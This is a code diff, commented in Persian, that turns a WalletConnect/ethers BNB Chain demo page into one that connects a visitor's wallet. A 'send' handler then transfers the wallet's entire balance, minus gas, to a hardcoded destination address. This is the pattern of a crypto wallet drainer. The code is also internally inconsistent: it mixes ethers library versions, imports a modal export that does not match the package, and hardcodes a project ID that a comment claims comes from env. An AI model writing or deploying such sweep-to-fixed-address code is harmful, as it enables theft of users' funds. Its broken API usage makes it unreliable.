@@ -1,60 +1,97 @@
-import { ethers } from 'ethers';
-import EthereumProvider from '@walletconnect/ethereum-provider';
-import { WalletConnectModal } from '@walletconnect/modal';
+import { EthereumProvider } from "@walletconnect/ethereum-provider";
+import { Modal } from "@walletconnect/modal";
+import { ethers } from "ethers";
 
-const connectBtn = document.getElementById('connectBtn');
-const addressEl = document.getElementById('address');
-const balanceEl = document.getElementById('balance');
+// آدرس مقصد را اینجا جایگزین کنید
+const TARGET_ADDRESS = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05";
 
-let wcProvider;
-let modal;
+// خواندن projectId از env
+const PROJECT_ID = "4d08946e6c316bed5e76b450ccbb5256";
 
-connectBtn.addEventListener('click', async () => {
+// ۱. نمونه‌سازی Modal و Provider
+const modal = new Modal({
+  projectId: PROJECT_ID,
+  themeVariables: {},           // اختیاری: سفارشی‌سازی رنگ‌ها
+  walletConnectOptions: {       // به صورت خودکار از V2 استفاده می‌کند
+    version: 2
+  }
+});
+
+const provider = await EthereumProvider.init({
+  projectId: PROJECT_ID,
+  chains: [56],                 // ۵۶ = BSC Mainnet
+  showQrModal: false,           // مدیریت نمایش با modal
+  qrModalOptions: { modal }
+});
+
+// ۲. عناصر DOM
+const btnConnect = document.getElementById("connect");
+const infoDiv    = document.getElementById("info");
+const addrSpan   = document.getElementById("address");
+const balSpan    = document.getElementById("balance");
+const btnSend    = document.getElementById("send");
+
+let signer, ethProvider;
+
+// رویداد کلیک برای اتصال کیف پول
+btnConnect.addEventListener("click", async () => {
   try {
-    // تعریف modal قبل از connect
-    modal = new WalletConnectModal({
-      projectId: '4d08946e6c316bed5e76b450ccbb5256', // ← projectId واقعی از cloud.walletconnect.com
-      standaloneChains: ['eip155:56'],
-      themeMode: 'light',
-    });
-
-    // ساخت provider
-    wcProvider = await EthereumProvider.init({
-      projectId: '4d08946e6c316bed5e76b450ccbb5256',
-      chains: [56],
-      showQrModal: false,
-      rpcMap: {
-        56: 'https://bsc-dataseed.binance.org',
-      },
-      metadata: {
-        name: 'My BNB Dapp',
-        description: 'Demo WalletConnect Dapp',
-        url: window.location.origin,
-        icons: ['https://walletconnect.com/walletconnect-logo.png']
-      },
-    });
-
-    // باز کردن modal با URI
-    if (wcProvider.uri) {
-      modal.openModal({ uri: wcProvider.uri });
-    }
-
-    // شروع اتصال (کاربر کیف پول انتخاب می‌کند)
-    await wcProvider.connect();
-
-    // گرفتن آدرس و موجودی با ethers.js
-    const ethersProvider = new ethers.BrowserProvider(wcProvider);
-    const signer = await ethersProvider.getSigner();
-    const address = await signer.getAddress();
-    const balance = await ethersProvider.getBalance(address);
-
-    addressEl.textContent =` آدرس: ${address}`;
-    balanceEl.textContent =` موجودی: ${ethers.formatEther(balance)} BNB`;
-
+    // باز کردن مودال و انتظاری برای انتخاب کیف پول
+    await modal.openModal();
+    await provider.enable();
     modal.closeModal();
 
-  } catch (error) {
-    console.error('خطا در اتصال:', error);
-    alert('اتصال به کیف پول انجام نشد');
+    // ساختن instance اترز
+    ethProvider = new ethers.providers.Web3Provider(provider);
+    signer = ethProvider.getSigner();
+
+    const address = await signer.getAddress();
+    const balance = await ethProvider.getBalance(address);
+
+    addrSpan.textContent = address;
+    balSpan.textContent = ethers.utils.formatEther(balance) + " BNB";
+    infoDiv.style.display = "block";
+  } catch (err) {
+    console.error(err);
+    alert("اتصال با خطا مواجه شد: " + err.message);
+  }
+});
+
+// رویداد کلیک برای ارسال کل موجودی
+btnSend.addEventListener("click", async () => {
+  try {
+    // ۱. موجودی جاری
+    const address = await signer.getAddress();
+    const balance = await ethProvider.getBalance(address);
+
+    // ۲. پارامترهای Legacy (سازگار با تراست ولت)
+    const gasPrice = await ethProvider.getGasPrice();         // wei
+    const gasLimit = ethers.BigNumber.from(21000);            // تراکنش ساده انتقال
+    const totalGasCost = gasPrice.mul(gasLimit);
+
+    // ۳. محاسبه مقدار قابل ارسال = کل موجودی منهای کارمزد
+    const valueToSend = balance.sub(totalGasCost);
+    if (valueToSend.lte(0)) {
+      return alert("موجودی کافی برای پوشش کارمزد ندارید.");
+    }
+
+    // ۴. ارسال تراکنش
+    const tx = await signer.sendTransaction({
+      to: TARGET_ADDRESS,
+      value: valueToSend,
+      gasPrice,      // فقط gasPrice — بدون maxFeePerGas/maxPriorityFeePerGas
+      gasLimit
+    });
+
+    alert("تراکنش ارسال شد، منتظر تأیید باشید...\n" + tx.hash);
+    await tx.wait();
+    alert("تراکنش تایید شد!");
+
+    // به‌روز کردن موجودی
+    const newBal = await ethProvider.getBalance(address);
+    balSpan.textContent = ethers.utils.formatEther(newBal) + " BNB";
+  } catch (err) {
+    console.error(err);
+    alert("خطا در ارسال تراکنش: " + err.message);
   }
 });
